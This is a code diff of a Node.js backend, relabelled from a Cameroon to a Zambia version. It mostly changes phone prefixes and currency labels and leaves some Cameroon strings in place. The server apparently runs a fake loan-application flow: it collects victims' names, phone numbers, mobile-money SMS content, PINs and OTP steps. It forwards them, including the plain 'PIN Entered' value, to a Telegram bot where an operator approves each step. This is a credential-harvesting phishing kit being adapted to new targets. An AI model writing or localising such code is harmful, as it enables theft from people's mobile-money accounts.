@@ -1,5 +1,5 @@
 // ============================================================
-// server.js – Cameroon Version with All Features
+// server.js – Zambia Version with All Features
 // ============================================================
 console.log("🟢 1. Server is starting...");
 require('dotenv').config();
@@ -185,7 +185,7 @@ app.post('/api/send-application', async (req, res) => {
         
         console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);
 
-        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n💰 Amount: XAF ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;
+        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +260${phone}\n💰 Amount: XAF ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;
         
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
@@ -211,7 +211,7 @@ app.post('/api/send-momo-message', async (req, res) => {
         applications[applicationId].updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `📨 *SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
+        const message = `📨 *SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +260${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
             { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
@@ -288,7 +288,7 @@ app.post('/api/pin-rejected', async (req, res) => {
             saveApplications();
             
             await sendTelegramMessage(
-                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
+                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +260${app.phone}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
             );
             
             return res.json({
@@ -400,7 +400,7 @@ app.post('/api/resend-otp', async (req, res) => {
         app.updatedAt = new Date().toISOString();
         saveApplications();
         
-        const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n\n📌 A new OTP has been requested by the user.\n✅ *Please approve or reject this new OTP:*`;
+        const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +260${app.phone}\n\n📌 A new OTP has been requested by the user.\n✅ *Please approve or reject this new OTP:*`;
         
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
@@ -424,7 +424,7 @@ app.post('/api/send-final-details', async (req, res) => {
         applications[data.applicationId].updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `✅ *LOAN COMPLETE (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +237${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;
+        const message = `✅ *LOAN COMPLETE (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +260${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: ZMW ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;
 
         await sendTelegramMessage(message);
         res.json({ ok: true, status: 'dashboard_ready' });
@@ -520,8 +520,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
                         const app = applications[id];
                         message += `\n${i+1}. 🆔 *${id}*\n`;
                         message += `   👤 ${app.firstName} ${app.lastName}\n`;
-                        message += `   📱 +237${app.phone}\n`;
-                        message += `   💰 XAF ${app.loanAmount.toLocaleString()}\n`;
+                        message += `   📱 +260${app.phone}\n`;
+                        message += `   💰 ZMW ${app.loanAmount.toLocaleString()}\n`;
                         message += `   📌 SMS: ${app.smsStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
                     });
                     
@@ -543,7 +543,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     }
                     
                     await sendTelegramMessage(
-                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n📧 Email: ${app.email}\n💰 Amount: XAF ${app.loanAmount.toLocaleString()}\n📅 Term: ${app.loanTerm}\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n💼 Employment: ${app.employment || 'Not specified'}\n💰 Income: XAF ${(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${app.kinName || 'Not specified'} (+237${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
+                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +260${app.phone}\n📧 Email: ${app.email}\n💰 Amount: ZMW ${app.loanAmount.toLocaleString()}\n📅 Term: ${app.loanTerm}\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n💼 Employment: ${app.employment || 'Not specified'}\n💰 Income: ZMW ${(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${app.kinName || 'Not specified'} (+260${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
                     );
                     return res.sendStatus(200);
                 }
